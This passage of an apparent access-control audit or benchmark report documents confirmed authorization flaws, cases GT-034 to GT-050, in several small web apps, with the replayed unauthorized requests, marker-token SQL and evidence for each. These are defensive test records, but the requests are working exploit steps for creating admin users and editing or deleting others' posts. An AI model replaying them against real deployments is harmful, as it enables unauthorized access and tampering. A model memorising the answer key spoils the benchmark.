- **Unauthorized Test Case**: Request admin/adduser.jsp as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET admin/adduser.jsp`
   - HTTP status: **200**
   - form_content_exposed: **True**

**Evidence summary**: visitor GET admin/adduser.jsp returned 200 and serves the protected admin form without any session (form_content_exposed=True).

**Evidence files**: [GT-034.json](audit/jspblog/evidence/GT-034.json), [GT-034_GT-034_visitor.html](audit/jspblog/evidence/GT-034_GT-034_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-035"></a>
### GT-035 · Jspblog · VPE

- **Endpoint / Operation**: `admin/adduser2.jsp`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated administrator may create an application user.
- **Unauthorized Test Case**: Submit a new user payload to admin/adduser2.jsp as visitor.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `user`
   - token_name: `DRHLGT_user_8684167034`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/adduser2.jsp name=DRHLGT_user_8684167034`
   - HTTP status: **200**
   - user_row_created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COUNT(*) FROM user WHERE name='DRHLGT_user_8684167034';
```

**Evidence summary**: visitor POST admin/adduser2.jsp returned 200; a user row with the token name was created in the portal database (created=True).

**Evidence files**: [GT-035.json](audit/jspblog/evidence/GT-035.json), [GT-035_gt035_visitor.html](audit/jspblog/evidence/GT-035_gt035_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-036"></a>
### GT-036 · Jspblog · VPE

- **Endpoint / Operation**: `admin/admin.jsp`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authenticated administrator may access the administration dashboard.
- **Unauthorized Test Case**: Request admin/admin.jsp as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET admin/admin.jsp`
   - HTTP status: **200**
   - form_content_exposed: **True**

**Evidence summary**: visitor GET admin/admin.jsp returned 200 and serves the protected admin form without any session (form_content_exposed=True).

**Evidence files**: [GT-036.json](audit/jspblog/evidence/GT-036.json), [GT-036_GT-036_visitor.html](audit/jspblog/evidence/GT-036_GT-036_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-037"></a>
### GT-037 · Jspblog · VPE

- **Endpoint / Operation**: `admin/editnews.jsp`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authenticated administrator may access the news-management and edit-selection page.
- **Unauthorized Test Case**: Request admin/editnews.jsp as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `news`
   - row: `headline='Java'`
   - column: `body`
   - token: `DRHLGT_editlist_8684167679`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET admin/editnews.jsp`
   - HTTP status: **200**
   - news_content_token_exposed: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE news SET body='DRHLGT_editlist_8684167679' WHERE headline='Java';
```

**Evidence summary**: visitor GET admin/editnews.jsp returned 200; the news-management page lists the news rows and exposed the token injected into a news body (exposed=True).

**Evidence files**: [GT-037.json](audit/jspblog/evidence/GT-037.json), [GT-037_gt037_visitor.html](audit/jspblog/evidence/GT-037_gt037_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-038"></a>
### GT-038 · Jspblog · VPE

- **Endpoint / Operation**: `admin/editnews2.jsp`
- **Operation Type**: Resource Access / Update
- **Expected Authorization Requirement**: Only an authenticated administrator may open or submit the news-edit operation.
- **Unauthorized Test Case**: Request or submit admin/editnews2.jsp with headline and body parameters as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content. Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `news`
   - row: `headline='Java'`
   - column: `body`
   - token1: `DRHLGT_news_before_8684168024`
   - token2: `DRHLGT_news_after_8684168024`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/editnews2.jsp body=DRHLGT_news_after_8684168024`
   - HTTP status: **200**
   - db_body_before: `DRHLGT_news_before_8684168024`
   - db_body_after: `DRHLGT_news_after_8684168024`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE news SET body='DRHLGT_news_before_8684168024' WHERE headline='Java';
-- [2] scalar
SELECT body FROM news WHERE headline='Java' LIMIT 1;
```

**Evidence summary**: visitor POST admin/editnews2.jsp returned 200; the news body changed DRHLGT_news_before_8684168024 -> DRHLGT_news_after_8684168024 in the portal database (updated=True; the query carries no WHERE clause, so it applies to every row).

**Evidence files**: [GT-038.json](audit/jspblog/evidence/GT-038.json), [GT-038_gt038_visitor.html](audit/jspblog/evidence/GT-038_gt038_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-039"></a>
### GT-039 · JsForum · VPE

- **Endpoint / Operation**: `servlet/forum.AddForum`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated administrator may create a forum.
- **Unauthorized Test Case**: Submit AddForum as visitor or an ordinary user.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `forum_forums`
   - token_title: `DRHLGT_forum_8686015227`
   - lastforum_id: `36`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST servlet/forum.AddForum title=DRHLGT_forum_8686015227`
   - HTTP status: **302**
   - forum_row_created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(forum_id), 0) FROM forum_forums;
-- [2] scalar
SELECT COUNT(*) FROM forum_forums WHERE title='DRHLGT_forum_8686015227';
```

**Evidence summary**: visitor POST servlet/forum.AddForum returned 302; a forum row with the token title was created in the forum database (created=True).

**Evidence files**: [GT-039.json](audit/jsforum/evidence/GT-039.json), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-040"></a>
### GT-040 · JsForum · VPE

- **Endpoint / Operation**: `servlet/forum.AddReply`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated user may create a reply.
- **Unauthorized Test Case**: Submit AddReply as visitor without a session.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `forum_message`
   - token_message: `DRHLGT_reply_8686015941`
   - forum_id: `7`
   - thread_id: `21`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST servlet/forum.AddReply message=DRHLGT_reply_8686015941`
   - HTTP status: **302**
   - reply_row_created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(reply_id), 0) FROM forum_message WHERE forum_id=7 AND thread_id=21;
-- [2] scalar
SELECT COUNT(*) FROM forum_message WHERE message='DRHLGT_reply_8686015941';
```

**Evidence summary**: visitor POST servlet/forum.AddReply returned 302; a reply row with the token message was created in forum_message (created=True).

**Evidence files**: [GT-040.json](audit/jsforum/evidence/GT-040.json), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-041"></a>
### GT-041 · JsForum · VPE

- **Endpoint / Operation**: `servlet/forum.AddThread`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated user may create a thread.
- **Unauthorized Test Case**: Submit AddThread as visitor without a session.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `forum_threads`
   - token_title: `DRHLGT_thread_8686016559`
   - forum_id: `7`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST servlet/forum.AddThread title=DRHLGT_thread_8686016559`
   - HTTP status: **302**
   - thread_row_created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(thread_id), 0) FROM forum_threads WHERE forum_id=7;
-- [2] scalar
SELECT COUNT(*) FROM forum_threads WHERE title='DRHLGT_thread_8686016559';
```

**Evidence summary**: visitor POST servlet/forum.AddThread returned 302; a thread row with the token title was created in forum_threads (created=True).

**Evidence files**: [GT-041.json](audit/jsforum/evidence/GT-041.json), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-042"></a>
### GT-042 · JsForum · HPE

- **Endpoint / Operation**: `servlet/forum.AddReply with user=user2`
- **Operation Type**: Create
- **Expected Authorization Requirement**: The author of a new reply must be derived from the authenticated session and must not be selected by a request parameter.
- **Unauthorized Test Case**: Log in as user1 and submit AddReply with the user parameter changed to user2.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - token: `DRHLGT_reply_forge_8686017023`
   - attacker_session_user: `user1`
   - forged_author_param: `user2`

**2. Replay attack request (role: user1 (logged-in session))**:
   - Request: `POST servlet/forum.AddReply user=user2 message=DRHLGT_reply_forge_8686017023`
   - HTTP status: **302**
   - row_created: **True**
   - row_author: `user2`
   - author_forged_to_user2: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(reply_id), 0) FROM forum_message WHERE forum_id=7 AND thread_id=21;
-- [2] query
SELECT user FROM forum_message WHERE message='DRHLGT_reply_forge_8686017023' LIMIT 1;
```

**Evidence summary**: user1 POST servlet/forum.AddReply with the user parameter set to user2 returned 302; the created content carries user2 as its author although the session belongs to user1 (author_forged=True).

**Evidence files**: [GT-042.json](audit/jsforum/evidence/GT-042.json), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-043"></a>
### GT-043 · JsForum · HPE

- **Endpoint / Operation**: `servlet/forum.AddThread with user=user2`
- **Operation Type**: Create
- **Expected Authorization Requirement**: The author of a new thread and its initial message must be derived from the authenticated session.
- **Unauthorized Test Case**: Log in as user1 and submit AddThread with the user parameter changed to user2.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - token: `DRHLGT_thread_forge_8686018444`
   - attacker_session_user: `user1`
   - forged_author_param: `user2`

**2. Replay attack request (role: user1 (logged-in session))**:
   - Request: `POST servlet/forum.AddThread user=user2 message=DRHLGT_thread_forge_8686018444`
   - HTTP status: **302**
   - row_created: **True**
   - row_author: `user2`
   - author_forged_to_user2: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(thread_id), 0) FROM forum_threads WHERE forum_id=7;
-- [2] query
SELECT thread_id FROM forum_threads WHERE title='DRHLGT_thread_forge_8686018444' LIMIT 1;
-- [3] query
SELECT user FROM forum_message WHERE forum_id=7 AND thread_id=59 AND reply_id='0' LIMIT 1;
```

**Evidence summary**: user1 POST servlet/forum.AddThread with the user parameter set to user2 returned 302; the created content carries user2 as its author although the session belongs to user1 (author_forged=True).

**Evidence files**: [GT-043.json](audit/jsforum/evidence/GT-043.json), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-044"></a>
### GT-044 · JsForum · HPE

- **Endpoint / Operation**: `forum/editmessage.jsp (reply of another user)`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The edit interface of a message must be available only to the message author or an administrator; a user must not open the edit form of another user's message.
- **Unauthorized Test Case**: Log in as user1 and open forum/editmessage.jsp for a reply authored by user2.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `forum_message`
   - row: `forum_id=7, thread_id=21, reply_id=2`
   - message_token: `DRHLGT_usermsg_8686019777`
   - author: `user2`
   - Note: documented precondition: a reply authored by user2 was inserted for the test (the database baseline was restored after the record)

**2. Replay attack request (role: user1 (logged-in session, not the reply author))**:
   - Request: `GET forum/editmessage.jsp?forum_id=7&thread_id=21&reply_id=2`
   - HTTP status: **200**
   - other_users_message_token_exposed_in_edit_form: **True**
   - change_submit_status: `302`
   - db_message_after_submit: `DRHLGT_usermsg_8686019777`
   - write_remained_owner_gated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(reply_id), 0) FROM forum_message WHERE forum_id=7 AND thread_id=21;
-- [2] execute
INSERT INTO forum_message (forum_id, thread_id, reply_id, message, user, date_time) VALUES (7, 21, 2, 'DRHLGT_usermsg_8686019777', 'user2', NOW());
-- [3] scalar
SELECT message FROM forum_message WHERE forum_id=7 AND thread_id=21 AND reply_id=2 LIMIT 1;
```

**Evidence summary**: user1 GET forum/editmessage.jsp for user2's reply returned 200; the edit form rendered user2's message content (token exposed=True); the submitted ChangeMessage left the row unchanged (write owner-gated=True), bounding the impact to the unauthorized edit-interface access.

**Evidence files**: [GT-044.json](audit/jsforum/evidence/GT-044.json), [GT-044_gt044_user1_editmessage.html](audit/jsforum/evidence/GT-044_gt044_user1_editmessage.html), [JsForum audit log](audit/jsforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-045"></a>
### GT-045 · jwablogger · VPE

- **Endpoint / Operation**: `blogger/viewEntry/5444/drhl_test_entry.html`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: An entry with isVisible=false must be available only to an authorized administrator or owner according to the application policy.
- **Unauthorized Test Case**: Request the non-visible entry as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `blog_entry / blog_entry_text`
   - inserted_entry_id: `5445`
   - title_token: `DRHLGT_hidden_entry_8684767207`
   - is_visible: `false`
   - Note: documented precondition: a fresh entry with is_visible='false' was inserted for the test (the released endpoint text names entry 5444/drhl_test_entry from the original deployment; in the current deployment that entry is a cached seeded row, so the fresh entry avoids the response cache); the database baseline was restored after the record

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET blogger/viewEntry/5445/DRHLGT_hidden_entry_8684767207_internal.html (is_visible='false')`
   - HTTP status: **200**
   - non_visible_entry_token_exposed: **True**

**3. Replay attack request (role: visitor (no login))**:
   - Request: `GET blogger/viewEntry/1927/software_sensation_has_released_version_25_of_jwebapp.html (naturally non-visible entry, no precondition)`
   - HTTP status: **200**
   - natural_non_visible_entry_content_exposed: **True**

**4. Replay attack request (role: visitor (no login))**:
   - Request: `POST blogger/saveEntry (entry creation)`
   - HTTP status: **200**
   - entry_creation_denied: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COALESCE(MAX(blog_entry_id), 0) + 1 FROM blog_entry;
-- [2] execute
INSERT INTO blog_entry (author, title, tags, description, internal_name, external_url, is_visible, has_comments, has_anonymous_comments) VALUES ('admin', 'DRHLGT_hidden_entry_8684767207', 'drhlgt', 'DRHLGT_hidden_entry_8684767207 description', 'DRHLGT_hidden_entry_8684767207_internal', '', 'false', 'false', 'false');
-- [3] execute
INSERT INTO blog_entry_text (blog_entry_id, blog_text) VALUES (5445, 'DRHLGT_hidden_entry_8684767207 body text');
-- [4] query
SELECT blog_entry_id, title, internal_name FROM blog_entry WHERE is_visible='false' AND blog_entry_id=1927 LIMIT 1;
```

**Evidence summary**: visitor GET blogger/viewEntry/5445 returned 200 and served the full content of the fresh entry with is_visible='false' (token exposed=True); a naturally non-visible entry (1927) is likewise served (exposed=True), while entry creation requires login (denied=True).

**Evidence files**: [GT-045.json](audit/jwablogger/evidence/GT-045.json), [GT-045_gt045_visitor_new_entry.html](audit/jwablogger/evidence/GT-045_gt045_visitor_new_entry.html), [GT-045_gt045_visitor_1927.html](audit/jwablogger/evidence/GT-045_gt045_visitor_1927.html), [jwablogger audit log](audit/jwablogger/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-046"></a>
### GT-046 · DjangoBlog · VPE

- **Endpoint / Operation**: `eee/ (unpublished PostDetail)`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: A post with status=0 must be visible only to a staff user; visitors must receive a not-found or denial response.
- **Unauthorized Test Case**: Request an unpublished post (status=0) as visitor (the validation used a freshly inserted unpublished post with marker tokens in its title and content).
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `blog_post`
   - inserted_unpublished_post: `{'title': 'DRHLGT_unpublished_8707965774', 'slug': 'drhlgt_unpublished_8707965774', 'status': 0, 'content_token': 'DRHLGT_unpublished_8707965774 content'}`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET /drhlgt_unpublished_8707965774/ (unpublished post, status=0)`
   - HTTP status: **200**
   - unpublished_post_token_exposed: **True**

**3. restore**:
   - kind: `restore`
   - inserted_post_deleted: `True`

#### SQL Statements Executed (chronological order)

```sql
-- [1] sqlite
INSERT INTO blog_post (title, slug, author_id, content, created_on, updated_on, status) VALUES ('DRHLGT_unpublished_8707965774', 'drhlgt_unpublished_8707965774', 1, 'DRHLGT_unpublished_8707965774 content', datetime('now'), datetime('now'), 0);
-- [2] sqlite
DELETE FROM blog_post WHERE slug='drhlgt_unpublished_8707965774';
-- [3] sqlite
SELECT COUNT(*) FROM blog_post WHERE slug='drhlgt_unpublished_8707965774';
```

**Evidence summary**: a fresh unpublished post (status=0) with marker tokens was inserted; visitor GET /drhlgt_unpublished_8707965774/ returned 200 and served the unpublished post content (token exposed=True); the inserted post was deleted afterwards.

**Evidence files**: [GT-046.json](audit/djangoblog/evidence/GT-046.json), [GT-046_gt046_visitor_unpublished.html](audit/djangoblog/evidence/GT-046_gt046_visitor_unpublished.html), [DjangoBlog audit log](audit/djangoblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-047"></a>
### GT-047 · django_lms · VPE

- **Endpoint / Operation**: `add_item/`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an administrator or the role explicitly authorized to manage events/items may access and submit add_item.
- **Unauthorized Test Case**: Log in as user1 or user2 obtain a fresh CSRF token and submit the add-item form.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `app_newsandevents`
   - token_title: `DRHLGT_lms_item_8688173439`

**2. Replay attack request (role: user1 (ordinary student))**:
   - Request: `GET add_item/`
   - HTTP status: **200**
   - add_item_form_exposed: **True**
   - csrf_token_obtained: **True**

**3. Replay attack request (role: user1 (ordinary student))**:
   - Request: `POST add_item/ title=DRHLGT_lms_item_8688173439 (fresh CSRF token)`
   - HTTP status: **302**
   - item_row_created: **True**

**4. Replay attack request (role: visitor (no login))**:
   - Request: `GET add_item/`
   - HTTP status: **302**
   - form_also_exposed_to_visitor: **False**

#### SQL Statements Executed (chronological order)

```sql
-- [1] psql
SELECT COUNT(*) FROM app_newsandevents WHERE title='DRHLGT_lms_item_8688173439';
-- [2] psql
SELECT COUNT(*) FROM app_newsandevents WHERE title='DRHLGT_lms_item_8688173439';
```

**Evidence summary**: user1 GET add_item/ returned 200 with the add-item form (CSRF token obtained); the POST returned 302 and created the item row with the token title in app_newsandevents (created=True); the form is likewise served to a visitor because the view has no authorization decorator.

**Evidence files**: [GT-047.json](audit/django_lms/evidence/GT-047.json), [GT-047_gt047_user1_add_item_form.html](audit/django_lms/evidence/GT-047_gt047_user1_add_item_form.html), [django_lms audit log](audit/django_lms/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-048"></a>
### GT-048 · BBS_Pro · VPE

- **Endpoint / Operation**: `bbs_pub/`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The bulletin-publication page is an authenticated-user feature: logged-in users may open it, but unauthenticated visitors must be redirected to the login page.
- **Unauthorized Test Case**: Request bbs_pub/ as visitor without a session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `app01_category`
   - row: `id=1`
   - column: `name`
   - token: `DRHLGT_bbs_category_8705254506`
   - original_name_recorded: `True`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET /bbs_pub/ (bulletin-publication form)`
   - HTTP status: **200**
   - publication_form_exposed: **True**
   - category_token_exposed: **True**

**3. Replay attack request (role: visitor (no login))**:
   - Request: `POST /bbs_sub/ (anonymous publication attempt)`
   - HTTP status: **500**
   - anonymous_submission_crashed: **True**
   - posts_before: `16`
   - posts_after: `16`
   - token_post_rows_created: `0`
   - no_post_created_by_anonymous_submission: **True**

**4. Instrumentation (marker injection)**:
   - user1_password_reset_via_set_password: `True`
   - original_password_hash_recorded: `True`

**5. Replay attack request (role: user1 (logged-in ordinary user))**:
   - Request: `GET /bbs_pub/ (by-design access reference)`
   - HTTP status: **200**
   - login_succeeded: **True**
   - logged_in_user_access_is_by_design: **True**

**6. restore**:
   - kind: `restore`
   - category_name_reverted: `True`
   - user1_password_hash_reverted: `True`

#### SQL Statements Executed (chronological order)

```sql
-- [1] sqlite
SELECT name FROM app01_category WHERE id=1;
-- [2] sqlite
SELECT password FROM auth_user WHERE username='user1';
-- [3] sqlite
SELECT COUNT(*) FROM app01_bbs;
-- [4] sqlite
UPDATE app01_category SET name='DRHLGT_bbs_category_8705254506' WHERE id=1;
-- [5] sqlite
SELECT COUNT(*) FROM app01_bbs;
-- [6] sqlite
SELECT COUNT(*) FROM app01_bbs WHERE title LIKE '%DRHLGT_bbs_category_8705254506%';
-- [7] sqlite
UPDATE app01_category SET name='校园学术' WHERE id=1;
-- [8] sqlite
UPDATE auth_user SET password='pbkdf2_sha256$12000$jnTEO0SkZfOr$TuAfPx36TqS/NBrMhLbWEsBjQntC55HcdUex6LsLU9Y=' WHERE username='user1';
-- [9] sqlite
SELECT name FROM app01_category WHERE id=1;
-- [10] sqlite
SELECT password FROM auth_user WHERE username='user1';
```

**Evidence summary**: visitor GET /bbs_pub/ returned 200 and served the bulletin-publication form (category token exposed=True); the anonymous submission attempt crashed with HTTP 500 and created no post (posts 16 -> 16); a logged-in ordinary user opens the page by design (200). The category name was reverted afterwards.

**Evidence files**: [GT-048.json](audit/BBS_pro/evidence/GT-048.json), [GT-048_gt048_visitor_bbs_pub.html](audit/BBS_pro/evidence/GT-048_gt048_visitor_bbs_pub.html), [BBS_Pro audit log](audit/BBS_pro/audit_log.md)
**Database restore**: ✅ The instrumented database values were restored to their original values after this record and verified by re-querying the touched rows; application files touched during validation (if any) were restored as well.

---

<a id="GT-049"></a>
### GT-049 · orangeforum · HPE

- **Endpoint / Operation**: `categories/1/topics/9/comments/34/edit (Update)`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only the comment owner or an authorized moderator/administrator may update comment 34.
- **Unauthorized Test Case**: Log in as user1 and submit an Update action for comment 34 owned by another ordinary user.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `comments`
   - row: `comment_id=34`
   - column: `content`
   - owner_user_id: `3`
   - token1: `DRHLGT_c34_before_8703903437`
   - token2: `DRHLGT_c34_after_8703903437`
   - original_content_recorded: `True`

**2. _restore_probes**:
   - kind: `_restore_probes`
   - probes: `[{'sql': 'SELECT content FROM comments WHERE comment_id=34', 'expected': '> t4krXAMuCHzRg8EoPxvkDqSAcE6uNM'}, {'sql': 'SELECT is_sticky FROM comments WHERE comment_id=34', 'expected': 't'}]`

**3. Replay attack request (role: user1 (not the comment owner))**:
   - Request: `GET categories/1/topics/9/comments/34/edit`
   - HTTP status: **200**
   - edit_form_exposed_other_users_comment: **True**
   - csrf_token_obtained: **True**

**4. Replay attack request (role: user1 (not the comment owner))**:
   - Request: `POST categories/1/topics/9/comments/34/edit action=Update content=DRHLGT_c34_after_8703903437`
   - HTTP status: **303**
   - db_content_before: `DRHLGT_c34_before_8703903437`
   - db_content_after: `DRHLGT_c34_after_8703903437`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] psql
SELECT user_id FROM comments WHERE comment_id=34;
-- [2] psql
SELECT content FROM comments WHERE comment_id=34;
-- [3] psql
SELECT is_sticky FROM comments WHERE comment_id=34;
-- [4] psql
UPDATE comments SET content='DRHLGT_c34_before_8703903437' WHERE comment_id=34;
-- [5] psql
SELECT content FROM comments WHERE comment_id=34;
```

**Evidence summary**: user1 GET categories/1/topics/9/comments/34/edit returned 200 with the edit form of user2's comment (content token exposed=True); the Update POST returned 303 and changed the comment content DRHLGT_c34_before_8703903437 -> DRHLGT_c34_after_8703903437 (updated=True).

**Evidence files**: [GT-049.json](audit/orangeforum/evidence/GT-049.json), [GT-049_gt049_user1_edit_form.html](audit/orangeforum/evidence/GT-049_gt049_user1_edit_form.html), [orangeforum audit log](audit/orangeforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-050"></a>
### GT-050 · orangeforum · HPE

- **Endpoint / Operation**: `categories/1/topics/9/comments/34/edit (Delete)`
- **Operation Type**: Delete
- **Expected Authorization Requirement**: Only the comment owner or an authorized moderator/administrator may delete comment 34.
- **Unauthorized Test Case**: Log in as user1 and submit a Delete action for comment 34 owned by another ordinary user.
- **Verification Method**: Delete-type check: insert a row carrying a unique token into the database, then replay the delete request as the attacking role and check whether the token row disappears.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `comments`
   - row: `comment_id=34`
   - column: `content`
   - token: `DRHLGT_c34_delete_8703905223`
   - owner_user_id: `3`
   - topic_num_comments_before: `5`

**2. _restore_probes**:
   - kind: `_restore_probes`
   - probes: `[{'sql': 'SELECT COUNT(*) FROM comments WHERE comment_id=34', 'expected': '1'}, {'sql': 'SELECT content FROM comments WHERE comment_id=34', 'expected': '> t4krXAMuCHzRg8EoPxvkDqSAcE6uNM'}, {'sql': 'SELECT num_comments FROM topics WHERE topic_id=9', 'expected': '5'}, {'sql': 'SELECT num_comments FROM users WHERE user_id=3', 'expected': '27'}]`

**3. Replay attack request (role: user1 (not the comment owner))**:
   - Request: `GET categories/1/topics/9/comments/34/edit`
   - HTTP status: **200**
   - edit_form_exposed_other_users_comment: **True**
   - csrf_token_obtained: **True**

**4. Replay attack request (role: user1 (not the comment owner))**:
   - Request: `POST categories/1/topics/9/comments/34/edit action=Delete`
   - HTTP status: **303**
   - comment_exists_after: `0`
   - deleted: **True**
   - topic_num_comments_after: `4`

#### SQL Statements Executed (chronological order)

```sql
-- [1] psql
SELECT content FROM comments WHERE comment_id=34;
-- [2] psql
SELECT is_sticky FROM comments WHERE comment_id=34;
-- [3] psql
SELECT user_id FROM comments WHERE comment_id=34;
-- [4] psql
SELECT content FROM comments WHERE comment_id=34;
-- [5] psql
SELECT num_comments FROM topics WHERE topic_id=9;
-- [6] psql
SELECT num_comments FROM users WHERE user_id=3;
-- [7] psql
UPDATE comments SET content='DRHLGT_c34_delete_8703905223' WHERE comment_id=34;
-- [8] psql
SELECT COUNT(*) FROM comments WHERE comment_id=34;
-- [9] psql
SELECT num_comments FROM topics WHERE topic_id=9;
```

**Evidence summary**: user1 GET categories/1/topics/9/comments/34/edit returned 200 with the edit form of user2's comment (token exposed=True); the Delete POST returned 303 and removed comment 34 (exists_after=0), with the topic comment counter decremented 5 -> 4.

